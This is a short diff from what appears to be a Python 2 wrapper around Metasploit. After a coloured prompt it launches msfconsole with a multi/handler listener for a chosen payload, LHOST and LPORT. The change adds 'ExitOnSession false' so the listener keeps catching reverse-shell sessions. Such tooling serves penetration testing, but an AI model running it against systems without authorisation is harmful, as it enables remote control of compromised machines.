@@ -216,4 +216,4 @@ print ""
 handler = raw_input("\033[0;31mSetup multi/handler [Y/n]: \033[0m") or "Y"
 
 if (handler == "Y") or (handler =="y"):
-	subprocess.call('msfconsole -x "use multi/handler; set PAYLOAD ' + payload + '; set LHOST ' + ipaddr + '; set LPORT ' + lport + '; exploit -j;"', shell=True)
+	subprocess.call('msfconsole -x "use multi/handler; set PAYLOAD ' + payload + '; set LHOST ' + ipaddr + '; set LPORT ' + lport + '; set ExitOnSession false; exploit -j;"', shell=True)
